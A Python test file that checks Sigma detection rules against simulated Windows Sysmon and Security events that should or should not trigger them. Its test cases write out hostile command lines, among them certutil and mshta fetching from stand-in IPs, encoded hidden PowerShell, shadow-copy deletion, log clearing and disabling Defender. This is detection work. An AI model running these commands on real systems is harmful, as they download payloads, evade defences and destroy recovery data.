"""Phase 3: every Sigma rule in rules/sigma, tested on events that must and
must not trigger it.

The "must not" cases are the interesting ones: each is a normal thing that
looks close to the attack. If you change a rule, run these first. If you add
a rule, add cases here: `test_every_rule_has_cases` fails until you do.
"""

from datetime import datetime, timezone

import pytest

from bde.attack import TECHNIQUES
from bde.engine import RuleSet
from bde.event import SYSMON_CHANNEL, Event

T0 = datetime(2026, 11, 3, 9, 0, tzinfo=timezone.utc)
SYS32 = "C:\\Windows\\System32\\"
PS = SYS32 + "WindowsPowerShell\\v1.0\\powershell.exe"
WORD = "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"
EXPLORER = "C:\\Windows\\explorer.exe"
RUN_KEY = "HKU\\S-1-5-21-1\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater"
STAGE2 = "VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAFMASQBNAFUATABBAFQARQBEAC0AUwBUAEEARwBFAC0AMgAnAA=="


def proc(image, command, parent=EXPLORER, parent_command="", original=""):
    data = {"Image": image, "CommandLine": command, "ParentImage": parent, "ParentCommandLine": parent_command}
    if original:
        data["OriginalFileName"] = original
    return Event(1, T0, "WKSTN-07.corp.example", SYSMON_CHANNEL, data)


def net(image, destination, initiated="true"):
    return Event(3, T0, "WKSTN-07.corp.example", SYSMON_CHANNEL,
                 {"Image": image, "Initiated": initiated, "DestinationIp": destination, "DestinationPort": "443"})


def file(image, target):
    return Event(11, T0, "WKSTN-07.corp.example", SYSMON_CHANNEL, {"Image": image, "TargetFilename": target})


def reg(image, target, details):
    return Event(13, T0, "WKSTN-07.corp.example", SYSMON_CHANNEL,
                 {"Image": image, "TargetObject": target, "Details": details, "EventType": "SetValue"})


def security(event_id):
    return Event(event_id, T0, "SRV-APP-02.corp.example", "Security", {"SubjectUserName": "adm-rpatel"})


FIRE, QUIET = True, False

CASES = {
    "proc_office_spawns_script_engine": [
        (FIRE, proc(PS, "powershell.exe -nop", parent=WORD)),
        (FIRE, proc(SYS32 + "cmd.exe", "cmd.exe /c x", parent=WORD)),
        (QUIET, proc(SYS32 + "splwow64.exe", "splwow64.exe 8192", parent=WORD)),  # printing from Word
        (QUIET, proc(PS, "powershell.exe", parent=EXPLORER)),
    ],
    "proc_powershell_encoded_command": [
        (FIRE, proc(PS, f"powershell.exe -nop -w hidden -enc {STAGE2}")),
        (FIRE, proc(PS, f"powershell.exe /EncodedCommand {STAGE2}")),
        (FIRE, proc(PS, f"powershell.exe -e {STAGE2}")),
        (FIRE, proc("C:\\Tools\\renamed.exe", f"renamed.exe -ec {STAGE2}", original="PowerShell.EXE")),
        (QUIET, proc(PS, "powershell.exe -ExecutionPolicy Bypass -File C:\\Scripts\\inventory.ps1")),
        (QUIET, proc(PS, "powershell.exe -e short")),  # too short to hide a script
    ],
    "proc_powershell_hidden_window": [
        (FIRE, proc(PS, "powershell.exe -nop -w hidden -c x")),
        (FIRE, proc(PS, "powershell.exe -WindowStyle Hidden -File a.ps1")),
        (FIRE, proc(PS, "powershell.exe -win 1 -c x")),
        (QUIET, proc(PS, "powershell.exe -WindowStyle Normal -c x")),
        (QUIET, proc(PS, "powershell.exe -c Get-Item hidden.txt")),
    ],
    "net_script_engine_public_destination": [
        (FIRE, net(PS, "203.0.113.10")),
        (FIRE, net(SYS32 + "wscript.exe", "198.51.100.7")),
        (QUIET, net(PS, "10.20.0.21")),  # PowerShell remoting inside the company
        (QUIET, net(PS, "203.0.113.10", initiated="false")),  # someone connected *to* it
        (QUIET, net("C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", "192.0.2.15")),
    ],
    "net_proxy_binary_public_destination": [
        (FIRE, net(SYS32 + "rundll32.exe", "198.51.100.40")),
        (FIRE, net(SYS32 + "regsvr32.exe", "203.0.113.9")),
        (QUIET, net(SYS32 + "rundll32.exe", "192.168.1.20")),
        (QUIET, net(SYS32 + "svchost.exe", "198.51.100.40")),
    ],
    "file_script_engine_drops_payload": [
        (FIRE, file(PS, "C:\\Users\\jsmith\\AppData\\Roaming\\upd.ps1")),
        (FIRE, file(SYS32 + "certutil.exe", "C:\\Users\\Public\\abcdef.dll")),
        (QUIET, file(PS, "C:\\Users\\jsmith\\AppData\\Local\\report.csv")),  # data, not code
        (QUIET, file(PS, "C:\\Program Files\\Tool\\tool.exe")),  # needs admin rights anyway
        (QUIET, file(EXPLORER, "C:\\Users\\jsmith\\Downloads\\setup.exe")),
    ],
    "reg_run_key_modified": [
        (FIRE, reg("C:\\Users\\jsmith\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe", RUN_KEY, "OneDrive.exe")),
        (QUIET, reg(PS, "HKU\\S-1-5-21-1\\Software\\Microsoft\\Office\\16.0\\Word\\MRU", "x")),
    ],
    "reg_run_key_script_engine": [
        (FIRE, reg(PS, RUN_KEY, "C:\\Users\\jsmith\\AppData\\Roaming\\upd.ps1")),
        (FIRE, reg(SYS32 + "reg.exe", RUN_KEY, "powershell.exe -w hidden -File upd.ps1")),
        (QUIET, reg("C:\\Users\\jsmith\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe", RUN_KEY,
                    '"C:\\Users\\jsmith\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe" /background')),
    ],
    "proc_certutil_download": [
        (FIRE, proc(SYS32 + "certutil.exe", "certutil.exe -urlcache -split -f http://198.51.100.7/a.txt C:\\x.txt")),
        (FIRE, proc(SYS32 + "certutil.exe", "certutil /urlcache /f https://files.example/a C:\\a")),
        (QUIET, proc(SYS32 + "certutil.exe", "certutil.exe -hashfile C:\\Tools\\setup.exe SHA256")),
        (QUIET, proc(SYS32 + "certutil.exe", "certutil.exe -urlcache")),  # listing the cache, no URL
    ],
    "proc_certutil_decode": [
        (FIRE, proc(SYS32 + "certutil.exe", "certutil.exe -decode C:\\Users\\Public\\a.txt C:\\Users\\Public\\a.dll")),
        (QUIET, proc(SYS32 + "certutil.exe", "certutil.exe -encode a.bin a.txt")),
    ],
    "proc_rundll32_user_folder_dll": [
        (FIRE, proc(SYS32 + "rundll32.exe", "rundll32.exe C:\\Users\\Public\\abcdef.dll,DllRegisterServer")),
        (QUIET, proc(SYS32 + "rundll32.exe", "rundll32.exe shell32.dll,Control_RunDLL desk.cpl")),
    ],
    "proc_script_host_runs_user_script": [
        (FIRE, proc(SYS32 + "wscript.exe", '"C:\\Windows\\System32\\WScript.exe" "C:\\Users\\kchen\\Downloads\\invoice_1234.js"')),
        (QUIET, proc(SYS32 + "wscript.exe", "wscript.exe \\\\corp.example\\NETLOGON\\map-drives.vbs")),
        (QUIET, proc(SYS32 + "cscript.exe", "cscript.exe C:\\Windows\\System32\\slmgr.vbs /dli")),
    ],
    "proc_script_host_spawns_lolbin": [
        (FIRE, proc(SYS32 + "certutil.exe", "certutil -urlcache -f http://x", parent=SYS32 + "wscript.exe",
                    parent_command="wscript.exe C:\\Users\\kchen\\Downloads\\a.js")),
        (QUIET, proc(SYS32 + "cmd.exe", "cmd.exe /c net use", parent=SYS32 + "wscript.exe",
                     parent_command="wscript.exe \\\\corp.example\\NETLOGON\\map-drives.vbs")),
        (QUIET, proc(SYS32 + "notepad.exe", "notepad.exe", parent=SYS32 + "wscript.exe")),
    ],
    "proc_wmiprvse_spawns_shell": [
        (FIRE, proc(PS, f"powershell.exe -enc {STAGE2}", parent=SYS32 + "wbem\\WmiPrvSE.exe")),
        (QUIET, proc(SYS32 + "gpupdate.exe", "gpupdate.exe /force", parent=SYS32 + "wbem\\WmiPrvSE.exe")),
    ],
    "proc_remote_wmi_process_create": [
        (FIRE, proc(PS, "powershell -c Invoke-CimMethod -ComputerName SRV-FILE-01 -ClassName Win32_Process "
                        "-MethodName Create -Arguments @{CommandLine='x'}")),
        (FIRE, proc(SYS32 + "wbem\\WMIC.exe", "wmic /node:SRV-FILE-01 process call create \"cmd /c x\"")),
        (QUIET, proc(PS, "powershell -c Get-CimInstance -ComputerName SRV-FILE-01 -ClassName Win32_Process")),
    ],
    "proc_whoami_privileges": [
        (FIRE, proc(SYS32 + "whoami.exe", "whoami /all")),
        (FIRE, proc(SYS32 + "whoami.exe", "whoami -priv")),
        (QUIET, proc(SYS32 + "whoami.exe", "whoami")),
    ],
    "proc_domain_group_discovery": [
        (FIRE, proc(SYS32 + "net.exe", 'net group "Domain Admins" /domain')),
        (QUIET, proc(SYS32 + "net1.exe", 'net1 group "Domain Admins" /domain', parent=SYS32 + "net.exe")),
        (QUIET, proc(SYS32 + "net.exe", "net use Z: \\\\SRV-FILE-01\\share")),
    ],
    "proc_nltest_domain_discovery": [
        (FIRE, proc(SYS32 + "nltest.exe", "nltest /domain_trusts /all_trusts")),
        (FIRE, proc(SYS32 + "nltest.exe", "nltest /dclist:corp.example")),
        (QUIET, proc(SYS32 + "nltest.exe", "nltest /sc_query:corp.example")),
    ],
    "proc_inhibit_system_recovery": [
        (FIRE, proc(SYS32 + "vssadmin.exe", "vssadmin.exe delete shadows /all /quiet")),
        (FIRE, proc(SYS32 + "wbadmin.exe", "wbadmin delete catalog -quiet")),
        (FIRE, proc(SYS32 + "bcdedit.exe", "bcdedit /set {default} recoveryenabled No")),
        (QUIET, proc(SYS32 + "vssadmin.exe", "vssadmin list shadows")),  # the backup check twin
        (QUIET, proc(SYS32 + "wbadmin.exe", "wbadmin get versions")),
    ],
    "proc_event_log_cleared_wevtutil": [
        (FIRE, proc(SYS32 + "wevtutil.exe", "wevtutil cl Security")),
        (QUIET, proc(SYS32 + "wevtutil.exe", "wevtutil qe Security /c:5 /f:text")),
    ],
    "sec_security_log_cleared": [
        (FIRE, security(1102)),
        (QUIET, security(4624)),
    ],
    "proc_defender_disabled": [
        (FIRE, proc(PS, "powershell -c Set-MpPreference -DisableRealtimeMonitoring $true")),
        (QUIET, proc(PS, "powershell -c Set-MpPreference -DisableRealtimeMonitoring $false")),
        (QUIET, proc(PS, "powershell -c Get-MpPreference")),
    ],
    "proc_mshta_remote_or_inline": [
        (FIRE, proc(SYS32 + "mshta.exe", "mshta.exe http://198.51.100.7/a.hta")),
        (FIRE, proc(SYS32 + "mshta.exe", "mshta.exe vbscript:Close(Execute(\"x\"))")),
        (QUIET, proc(SYS32 + "mshta.exe", "mshta.exe C:\\Program Files\\Vendor\\setup.hta")),
    ],
}


@pytest.fixture(scope="module")
def rules():
    return {rule.name: rule for rule in RuleSet.load().sigma}


def test_every_rule_has_cases(rules):
    missing = sorted(set(rules) - set(CASES))
    assert not missing, f"add fire/no-fire cases for: {', '.join(missing)}"
    for name, cases in CASES.items():
        assert name in rules, f"cases for a rule that doesn't exist: {name}"
        assert any(e for e, _ in cases) and not all(e for e, _ in cases), f"{name} needs both kinds of case"


@pytest.mark.parametrize("name, expected, event", [
    pytest.param(name, expected, event, id=f"{name}-{'fires' if expected else 'quiet'}-{i}")
    for name, cases in CASES.items() for i, (expected, event) in enumerate(cases)
])
def test_rule_case(rules, name, expected, event):
    assert rules[name].matches(event) is expected, event.get("CommandLine") or event.data


def test_rules_only_tag_known_techniques(rules):
    for rule in rules.values():
        assert rule.techniques, f"{rule.name} has no ATT&CK technique tag"
        assert rule.tactics, f"{rule.name} has no ATT&CK tactic tag"
        for technique in rule.techniques:
            assert technique in TECHNIQUES, f"{rule.name}: {technique} is not in bde/attack.py"


def test_rule_files_are_named_after_their_rule(rules):
    for rule in rules.values():
        assert rule.path is not None and rule.path.stem == rule.name
